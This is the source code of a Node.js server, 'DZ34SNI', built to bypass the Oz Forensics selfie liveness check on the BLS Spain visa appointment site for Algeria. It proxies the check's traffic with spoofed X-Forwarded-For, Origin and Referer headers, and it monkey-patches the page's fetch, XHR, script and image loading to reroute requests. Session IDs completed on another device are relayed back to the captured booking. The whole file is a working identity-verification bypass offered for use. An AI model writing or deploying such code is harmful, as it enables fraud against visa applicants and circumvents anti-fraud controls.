/**
 * DZ34SNI Server v3.2 — OZ Proxy + IP Spoofing
 * Deploy on Render: https://dz34sni-26.onrender.com
 * 
 * Flow:
 * 1. Extension captures userId + transactionId + realIp → POST /task/:phone
 * 2. APK polls GET /task/:phone → receives task
 * 3. APK navigates to /oz-page?userId=...&transactionId=...&realIp=...&phone=...
 * 4. oz-page loads OZ SDK — ALL OZ requests go through /oz-proxy/:phone/*
 * 5. Server proxies to ozforensics.com with:
 *    - X-Forwarded-For: Agent's IP
 *    - Origin: https://algeria.blsspainglobal.com
 *    - Referer: https://algeria.blsspainglobal.com/dza/appointment/LivenessRequest
 * 6. Selfie completes → oz-page POSTs result to /result/:phone
 * 7. Extension polls GET /result/:phone → injects session_id into BLS page
 */

const express = require('express');
const cors = require('cors');
const https = require('https');
const { URL } = require('url');
const app = express();
const PORT = process.env.PORT || 3000;

// ═══════════════════════════════════════════
// MIDDLEWARE
// ═══════════════════════════════════════════
app.use(cors());

// Request logging
app.use((req, res, next) => {
    const ts = new Date().toISOString().substring(11, 19);
    const p = req.path.length > 80 ? req.path.substring(0, 80) + '...' : req.path;
    console.log(`[${ts}] ${req.method} ${p}`);
    next();
});

// JSON parsing for task/result routes only (not for proxy)
app.use('/task', express.json({ limit: '1mb' }));
app.use('/result', express.json({ limit: '1mb' }));

// ═══════════════════════════════════════════
// IN-MEMORY STORAGE
// ═══════════════════════════════════════════
const tasks = {};
const results = {};
const phoneIpMap = {};

// Cleanup every 5 minutes
setInterval(() => {
    const now = Date.now();
    const MAX = 30 * 60 * 1000;
    for (const p in tasks) {
        if (now - (tasks[p].timestamp || 0) > MAX) { delete tasks[p]; delete phoneIpMap[p]; }
    }
    for (const p in results) {
        if (now - (results[p].timestamp || 0) > MAX) { delete results[p]; }
    }
}, 5 * 60 * 1000);

// ═══════════════════════════════════════════
// TASK ROUTES
// ═══════════════════════════════════════════

app.post('/task/:phone', (req, res) => {
    const phone = req.params.phone;
    const b = req.body || {};
    if (!b.userId || !b.transactionId) return res.status(400).json({ ok: false, error: 'Missing userId or transactionId' });

    tasks[phone] = {
        userId: b.userId, transactionId: b.transactionId,
        realIp: b.realIp || '', cookies: b.cookies || '',
        userAgent: b.userAgent || '', pageUrl: b.pageUrl || '',
        verificationToken: b.verificationToken || '',
        timestamp: b.timestamp || Date.now()
    };
    if (b.realIp) phoneIpMap[phone] = b.realIp;

    console.log(`[TASK] 📥 ${phone}: userId=${b.userId.substring(0, 20)}... realIp=${b.realIp || 'none'}`);
    res.json({ ok: true });
});

app.get('/task/:phone', (req, res) => {
    const t = tasks[req.params.phone];
    if (t) {
        console.log(`[TASK] 📤 ${req.params.phone}: sending`);
        res.json({ ok: true, task: t });
    } else {
        res.json({ ok: false, task: null });
    }
});

// ═══════════════════════════════════════════
// RESULT ROUTES
// ═══════════════════════════════════════════

app.post('/result/:phone', (req, res) => {
    const phone = req.params.phone;
    const b = req.body || {};
    if (!b.event_session_id) return res.status(400).json({ ok: false, error: 'Missing event_session_id' });

    results[phone] = {
        event_session_id: b.event_session_id,
        status: b.status || 'completed',
        realIp: b.realIp || phoneIpMap[phone] || '',
        timestamp: b.timestamp || Date.now()
    };
    delete tasks[phone];

    console.log(`[RESULT] ✅ ${phone}: session=${b.event_session_id.substring(0, 20)}...`);
    res.json({ ok: true });
});

app.get('/result/:phone', (req, res) => {
    const r = results[req.params.phone];
    res.json(r ? { ok: true, result: r } : { ok: false, result: null });
});

// ═══════════════════════════════════════════
// CLEANUP
// ═══════════════════════════════════════════

app.delete('/clear/:phone', (req, res) => {
    const p = req.params.phone;
    delete tasks[p]; delete results[p]; delete phoneIpMap[p];
    res.json({ ok: true });
});

// ═══════════════════════════════════════════
// OZ PROXY — THE KEY FEATURE
// ═══════════════════════════════════════════
/**
 * /oz-proxy/:phone/* → proxies to ozforensics.com
 * 
 * Adds:
 * - Origin: https://algeria.blsspainglobal.com
 * - Referer: https://algeria.blsspainglobal.com/dza/appointment/LivenessRequest  
 * - X-Forwarded-For: <Agent's IP>
 * - User-Agent: Mobile Firefox
 *
 * This makes OZ Forensics see:
 * 1. The request comes from BLS Spain (correct Origin)
 * 2. The IP is the Agent's IP (not the phone's)
 */

// CORS preflight
app.options('/oz-proxy/*', (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', '*');
    res.setHeader('Access-Control-Max-Age', '86400');
    res.status(204).end();
});

app.all('/oz-proxy/:phone/*', (req, res) => {
    const phone = req.params.phone;
    const agentIp = phoneIpMap[phone] || '';
    const targetPath = req.params[0] || '';

    if (!targetPath) return res.status(400).json({ error: 'Missing target' });

    const targetUrl = 'https://' + targetPath + (req._parsedUrl.search || '');

    let parsedUrl;
    try { parsedUrl = new URL(targetUrl); } catch(e) {
        return res.status(400).json({ error: 'Invalid URL' });
    }

    // Security: only ozforensics.com
    if (!parsedUrl.hostname.includes('ozforensics.com')) {
        return res.status(403).json({ error: 'Forbidden domain' });
    }

    console.log(`[PROXY] ${req.method} → ${parsedUrl.hostname}${parsedUrl.pathname.substring(0, 50)} (IP: ${agentIp || 'none'})`);

    // Collect request body first (for POST requests)
    const chunks = [];
    req.on('data', c => chunks.push(c));
    req.on('end', () => {
        const bodyBuf = chunks.length > 0 ? Buffer.concat(chunks) : null;

        // Build proxy headers
        const h = {
            'Host': parsedUrl.hostname,
            'User-Agent': 'Mozilla/5.0 (Android 13; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0',
            'Origin': 'https://algeria.blsspainglobal.com',
            'Referer': 'https://algeria.blsspainglobal.com/dza/appointment/LivenessRequest'
        };

        // Copy some client headers
        ['accept', 'accept-language', 'content-type'].forEach(k => {
            if (req.headers[k]) h[k] = req.headers[k];
        });

        // THE KEY: Agent's IP
        if (agentIp) {
            h['X-Forwarded-For'] = agentIp;
            h['X-Real-IP'] = agentIp;
        }

        if (bodyBuf) h['Content-Length'] = bodyBuf.length;

        const opts = {
            hostname: parsedUrl.hostname,
            port: 443,
            path: parsedUrl.pathname + parsedUrl.search,
            method: req.method,
            headers: h,
            timeout: 60000
        };

        const proxyReq = https.request(opts, (proxyRes) => {
            // Copy response headers
            const skip = ['transfer-encoding', 'content-encoding', 'connection', 'keep-alive'];
            for (const [k, v] of Object.entries(proxyRes.headers)) {
                if (!skip.includes(k.toLowerCase())) {
                    if (k.toLowerCase() === 'access-control-allow-origin') {
                        res.setHeader(k, '*');
                    } else {
                        try { res.setHeader(k, v); } catch(e) {}
                    }
                }
            }

            res.setHeader('Access-Control-Allow-Origin', '*');
            res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS');
            res.setHeader('Access-Control-Allow-Headers', '*');

            res.status(proxyRes.statusCode);
            proxyRes.pipe(res);
        });

        proxyReq.on('error', (err) => {
            console.error(`[PROXY] ERR: ${err.message}`);
            if (!res.headersSent) res.status(502).json({ error: err.message });
        });

        proxyReq.on('timeout', () => {
            proxyReq.destroy();
            if (!res.headersSent) res.status(504).json({ error: 'Timeout' });
        });

        if (bodyBuf) proxyReq.write(bodyBuf);
        proxyReq.end();
    });
});

// ═══════════════════════════════════════════
// OZ-PAGE — Serves liveness page with proxied SDK
// ═══════════════════════════════════════════

app.get('/oz-page', (req, res) => {
    const { userId, transactionId, realIp, phone } = req.query;

    const esc = (s) => (s || '').replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '\\"').replace(/</g, '\\x3c').replace(/>/g, '\\x3e');
    const uid = esc(userId);
    const tid = esc(transactionId);
    const ip = esc(realIp);
    const ph = esc(phone);

    if (phone && realIp) phoneIpMap[phone] = realIp;

    const serverUrl = process.env.RENDER_EXTERNAL_URL || `https://dz34sni-26.onrender.com`;

    const html = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>BLS Liveness</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0f172a;font-family:system-ui,sans-serif;min-height:100vh}
.ld{position:fixed;inset:0;z-index:9999;background:#0f172a;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff}
.ld .logo{width:70px;height:70px;border-radius:50%;background:linear-gradient(135deg,#dc2626,#b91c1c);display:flex;align-items:center;justify-content:center;margin-bottom:16px;box-shadow:0 8px 32px rgba(220,38,38,.4)}
.ld .logo span{font-size:32px;font-weight:900}
.ld h2{font-size:18px;font-weight:700;margin-bottom:8px}
.ld p{font-size:13px;color:#94a3b8}
.ld-spin{width:40px;height:40px;border:4px solid rgba(255,255,255,.1);border-top-color:#0d9488;border-radius:50%;animation:sp .8s linear infinite;margin-top:20px}
@keyframes sp{to{transform:rotate(360deg)}}
#k2-ok{position:fixed;inset:0;z-index:2147483647;display:none;flex-direction:column;align-items:center;justify-content:center;background:linear-gradient(135deg,#059669,#0d9488,#0891b2);text-align:center;padding:30px}
.chk{width:100px;height:100px;border-radius:50%;background:rgba(255,255,255,.2);display:flex;align-items:center;justify-content:center;margin-bottom:20px;animation:pop .5s ease-out}
@keyframes pop{0%{transform:scale(0);opacity:0}70%{transform:scale(1.2)}100%{transform:scale(1);opacity:1}}
#st{position:fixed;bottom:10px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,.8);color:#fff;padding:8px 16px;border-radius:8px;font-size:12px;z-index:99999;text-align:center}
.ozliveness_logo,.ozliveness_version{display:none!important}
</style>
</head>
<body>

<div class="ld" id="ld">
    <div class="logo"><span>D</span></div>
    <h2>Chargement du selfie...</h2>
    <p>Preparez votre visage</p>
    <p style="margin-top:8px;font-size:11px;color:#0d9488">MODE PROXY — IP Agent</p>
    <div class="ld-spin"></div>
</div>

<div id="k2-ok">
    <div class="chk"><span style="font-size:50px;color:#fff">&#10003;</span></div>
    <p style="font-size:28px;font-weight:900;color:#fff;margin-bottom:8px">SELFIE FAIT AVEC SUCCES</p>
    <p style="font-size:16px;color:rgba(255,255,255,.8);margin-bottom:6px">\\u062a\\u0645 \\u0627\\u0644\\u062a\\u0642\\u0627\\u0637 \\u0627\\u0644\\u0633\\u064a\\u0644\\u0641\\u064a \\u0628\\u0646\\u062c\\u0627\\u062d</p>
    <p style="font-size:15px;color:rgba(255,255,255,.9);font-weight:700">Retour dans <span id="k2-c" style="background:rgba(255,255,255,.2);padding:4px 14px;border-radius:8px;font-size:22px">10</span>s</p>
</div>

<div id="st">Initialisation proxy...</div>

<!-- URL spoof for OZ SDK -->
<script>try{history.replaceState({},'','/dza/appointment/LivenessRequest');}catch(e){}</script>

<!-- ═══ INTERCEPT ALL ozforensics.com → route through server proxy ═══ -->
<script>
(function(){
    var PH = '${ph}';
    var PB = '${serverUrl}/oz-proxy/' + encodeURIComponent(PH) + '/';

    function rw(url) {
        if (typeof url !== 'string') return url;
        var m = url.match(/^https?:\\/\\/([^/]*ozforensics\\.com)(\\/.*)$/);
        return m ? PB + m[1] + m[2] : url;
    }

    // Patch fetch
    var _f = window.fetch;
    window.fetch = function(i, o) {
        if (typeof i === 'string') i = rw(i);
        else if (i && i.url) { var u = rw(i.url); if (u !== i.url) i = new Request(u, i); }
        return _f.call(this, i, o);
    };

    // Patch XHR
    var _xo = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(m, u) {
        arguments[1] = rw(u);
        return _xo.apply(this, arguments);
    };

    // Patch script.src
    var _ce = document.createElement.bind(document);
    document.createElement = function(tag) {
        var el = _ce(tag);
        if (tag.toLowerCase() === 'script') {
            var d = Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, 'src');
            if (d && d.set) {
                Object.defineProperty(el, 'src', {
                    set: function(v) { d.set.call(this, rw(v)); },
                    get: function() { return d.get.call(this); },
                    configurable: true
                });
            }
        }
        if (tag.toLowerCase() === 'link') {
            var d2 = Object.getOwnPropertyDescriptor(HTMLLinkElement.prototype, 'href');
            if (d2 && d2.set) {
                Object.defineProperty(el, 'href', {
                    set: function(v) { d2.set.call(this, rw(v)); },
                    get: function() { return d2.get.call(this); },
                    configurable: true
                });
            }
        }
        return el;
    };

    // Patch Image
    var _Im = window.Image;
    window.Image = function(w, h) {
        var img = new _Im(w, h);
        var d = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, 'src');
        if (d && d.set) {
            Object.defineProperty(img, 'src', {
                set: function(v) { d.set.call(this, rw(v)); },
                get: function() { return d.get.call(this); },
                configurable: true
            });
        }
        return img;
    };
    window.Image.prototype = _Im.prototype;

    document.getElementById('st').textContent = 'Proxy OK — chargement SDK...';
    console.log('[DZ34SNI] Proxy intercept installed: ' + PB);
})();
</script>

<!-- Form -->
<form id="formLiveness" method="post" action="/dza/appointment/LivenessResponse">
    <input type="hidden" name="event_session_id" id="event_session_id" value="">
    <input type="hidden" name="LivenessId" id="LivenessId" value="">
</form>

<!-- Load OZ SDK — will be intercepted by proxy rewrite -->
<script src="https://web-sdk.prod.cdn.spain.ozforensics.com/blsinternational/plugin_liveness.php"></script>

<!-- Launch liveness -->
<script>
var __ph = '${ph}', __srv = '${serverUrl}', __sent = false;

function goBack() {
    try { __dz34sni_bridge.onGoHome(); } catch(e) { try { window.Android.onGoHome(); } catch(e2) {} }
}

function showOK() {
    var ld = document.getElementById('ld'); if (ld) ld.style.display = 'none';
    document.getElementById('st').textContent = 'Selfie OK!';
    var ok = document.getElementById('k2-ok'); if (ok) ok.style.display = 'flex';
    var c = document.getElementById('k2-c'), n = 10;
    var t = setInterval(function() { n--; if (c) c.textContent = n; if (n <= 0) { clearInterval(t); goBack(); } }, 1000);
}

function postResult(sid) {
    if (__sent) return; __sent = true;
    document.getElementById('st').textContent = 'Envoi resultat...';
    try { __dz34sni_bridge.onStatus('Envoi resultat...'); } catch(e) {}
    try { window.Android.onSelfieComplete(sid); } catch(e) {}

    var url = __srv + '/result/' + encodeURIComponent(__ph);
    var body = JSON.stringify({ event_session_id: sid, status: 'completed', realIp: '${ip}', timestamp: Date.now() });
    function go(n) {
        fetch(url, { method: 'POST', headers: {'Content-Type':'application/json'}, body: body, cache: 'no-store' })
            .then(function() {
                console.log('[DZ34SNI] Result posted');
                try { __dz34sni_bridge.onResult(sid); } catch(e) {}
            })
            .catch(function() { if (n < 5) setTimeout(function() { go(n+1); }, 2000); });
    }
    go(0);
}

window.addEventListener('load', function() {
    document.getElementById('st').textContent = 'SDK charge — lancement...';
    try { __dz34sni_bridge.onStatus('Selfie en cours...'); } catch(e) {}

    setTimeout(function() {
        var ld = document.getElementById('ld'); if (ld) ld.style.display = 'none';
        try {
            if (typeof OzLiveness === 'undefined') {
                document.getElementById('st').textContent = 'ERREUR: SDK non charge';
                try { __dz34sni_bridge.onError('SDK not loaded'); } catch(e) {}
                try { window.Android.onSelfieError('SDK not loaded'); } catch(e) {}
                return;
            }
            document.getElementById('st').textContent = 'Selfie en cours...';
            OzLiveness.open({
                lang: 'en',
                meta: { 'user_id': '${uid}', 'transaction_id': '${tid}' },
                overlay_options: false,
                action: ['video_selfie_blank'],
                result_mode: 'safe',
                on_complete: function(r) {
                    var sid = r && r.event_session_id ? String(r.event_session_id) : '';
                    if (sid) {
                        try { document.getElementById('event_session_id').value = sid; } catch(e) {}
                        try { document.getElementById('LivenessId').value = sid; } catch(e) {}
                        postResult(sid);
                        showOK();
                    } else {
                        document.getElementById('st').textContent = 'ERREUR: pas de session ID';
                        try { window.Android.onSelfieError('No session ID'); } catch(e) {}
                    }
                },
                on_error: function(e) {
                    var msg = e && e.message ? e.message : String(e);
                    document.getElementById('st').textContent = 'Erreur: ' + msg;
                    try { __dz34sni_bridge.onError(msg); } catch(x) {}
                    try { window.Android.onSelfieError(msg); } catch(x) {}
                }
            });
        } catch(e) {
            document.getElementById('st').textContent = 'Erreur: ' + e.message;
            try { window.Android.onSelfieError(e.message); } catch(x) {}
        }
    }, 2500);
});
</script>
</body>
</html>`;

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(html);
});

// ═══════════════════════════════════════════
// HEALTH
// ═══════════════════════════════════════════

app.get('/', (req, res) => {
    res.json({
        service: 'DZ34SNI', version: '3.2',
        status: 'running',
        features: ['oz-proxy', 'ip-spoof', 'origin-spoof'],
        activeTasks: Object.keys(tasks).length,
        activeResults: Object.keys(results).length,
        uptime: Math.floor(process.uptime()) + 's'
    });
});

app.get('/health', (req, res) => res.json({ ok: true }));

app.get('/debug', (req, res) => {
    res.json({
        tasks: Object.keys(tasks).map(p => ({ phone: p, realIp: tasks[p].realIp, age: Math.floor((Date.now() - tasks[p].timestamp) / 1000) + 's' })),
        results: Object.keys(results).map(p => ({ phone: p, sid: (results[p].event_session_id || '').substring(0, 15) + '...' })),
        ipMap: phoneIpMap
    });
});

app.listen(PORT, () => {
    console.log(`\n🐉 DZ34SNI Server v3.2`);
    console.log(`   Port: ${PORT}`);
    console.log(`   Features: OZ Proxy + IP Spoof + Origin Spoof`);
    console.log(`   Ready!\n`);
});
